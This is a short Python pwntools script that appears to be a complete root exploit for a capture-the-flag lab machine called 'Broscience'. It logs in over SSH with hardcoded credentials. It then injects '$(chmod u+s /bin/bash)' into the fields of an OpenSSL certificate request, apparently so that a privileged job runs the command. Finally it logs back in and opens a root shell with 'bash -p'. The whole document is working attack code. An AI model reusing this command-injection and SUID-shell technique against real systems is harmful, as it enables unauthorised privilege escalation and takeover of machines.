import requests
import os



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Broscience - Ninhpn1337\n")

except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)
request = ssh(host="10.10.11.195", user="bill", password="iluvhorsesandgym")
shell = request.process("/bin/sh")
time.sleep(0.5)
shell.sendline(b"cd ~/Certs")
print("\n[\033[1;32m+\033[1;37m] Reg openssl.... Please wait 10s for get root \n")
time.sleep(0.5)
shell.sendline(b"openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1")
time.sleep(1)
shell.sendline(b"AU")
shell.sendline(b"$(chmod u+s /bin/bash)")
shell.sendline(b"$(chmod u+s /bin/bash)")
shell.sendline(b"$(chmod u+s /bin/bash)")
shell.sendline(b"$(chmod u+s /bin/bash)")
shell.sendline(b"$(chmod u+s /bin/bash)")
shell.sendline(b"test@gmail.com")
time.sleep(10)
print("\n[\033[1;32m+\033[1;37m] Re-ssh.... \n")
request = ssh(host="10.10.11.195", user="bill", password="iluvhorsesandgym")
shell = request.process("/bin/bash")
time.sleep(3)
shell.sendline(b"bash -p")
shell.interactive()



